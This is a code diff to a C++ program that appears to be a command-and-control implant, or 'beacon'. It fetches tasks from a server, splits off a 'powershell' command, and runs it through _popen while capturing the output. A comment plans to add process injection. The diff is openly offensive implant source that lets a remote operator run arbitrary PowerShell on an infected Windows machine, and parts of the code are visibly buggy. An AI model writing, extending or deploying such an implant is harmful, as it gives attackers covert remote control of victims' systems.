@@ -12,23 +12,24 @@ using std::string;
 const wchar_t* ACCEPTED_MIME_TYPES[] = {
     L"text/plain", L"application/octet-stream", L"text/html", NULL};
 
-void runPSCommand(string command);
+string runPSCommand(string command);
 int CreateTCPConn();
 bool sendHTTPTaskResult();
 
 static std::wstring beaconName = L"";
 
-bool runTask(std::string outBuffer, DWORD dwSize) {
+bool runTask(string outBuffer, DWORD dwSize) {
     printf("Running TASK: %.*s\n", dwSize, outBuffer.c_str());
 
     size_t pipePos = outBuffer.find('|');
 
     if (!pipePos) return false;
 
-    std::string cmd = outBuffer.substr(0, pipePos);
+    string cmd = outBuffer.substr(0, pipePos);
 
     if (cmd == "powershell")
-        runPSCommand(outBuffer.substr(outBuffer.find("|" + 1)));
+        std::cout << runPSCommand(outBuffer.substr(outBuffer.find("|" + 1)));
+
     return true;
 }
 
@@ -148,9 +149,26 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
     return didReceiveResponse;
 }
 
-void runPSCommand(std::string command) {
-    string powershellPrefix{"powershell -c "};
-    system((powershellPrefix + command).c_str());
+string runPSCommand(string command) {
+    char psBuffer[4096];
+    string res;
+
+    string powershellCommand =
+        "powershell -NoProfile -NonInteractive -Command \"" + command + "\"";
+
+    FILE* pPipe = _popen(powershellCommand.c_str(), "rt");
+
+    if (!pPipe) return "ERROR";
+
+    while (fgets(psBuffer, DEFAULT_PS_BUFLEN, pPipe)) {
+        res += psBuffer;
+        puts(psBuffer);  // THIS IS THE ONLY WAY TO GET STDOUT FIXME: NOT EVEN
+                         // WHEN I COUT << RESULT
+    }
+
+    int exitCode = _pclose(pPipe);
+
+    return res;
 
     // TODO: Make this process injection?
 }
@@ -191,4 +209,3 @@ int main(int argc, const char** argv) {
     }
 
     return 0;
-}
